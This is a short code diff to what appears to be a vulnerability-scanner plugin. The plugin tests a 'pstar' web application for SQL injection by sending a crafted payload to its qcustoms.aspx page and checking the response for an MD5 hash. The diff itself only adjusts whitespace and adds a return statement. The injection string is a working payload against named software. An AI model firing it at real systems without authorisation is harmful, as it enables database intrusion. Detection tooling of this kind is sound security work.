@@ -6,13 +6,14 @@
 def assign(service,arg):
     if service=="pstar":
         return True,arg
-    
+
 def audit(arg):
     payload = "HyperLink/qcustoms.aspx?type=A&no="
     url=arg + payload + '%27and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--'
     code, head, res, errcode,finalurl =  curl.curl(url)
     if code !=0 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
         security_hole('find sql injection: ' + arg + payload)
+        return arg
 
 
 if  __name__ == '__main__':
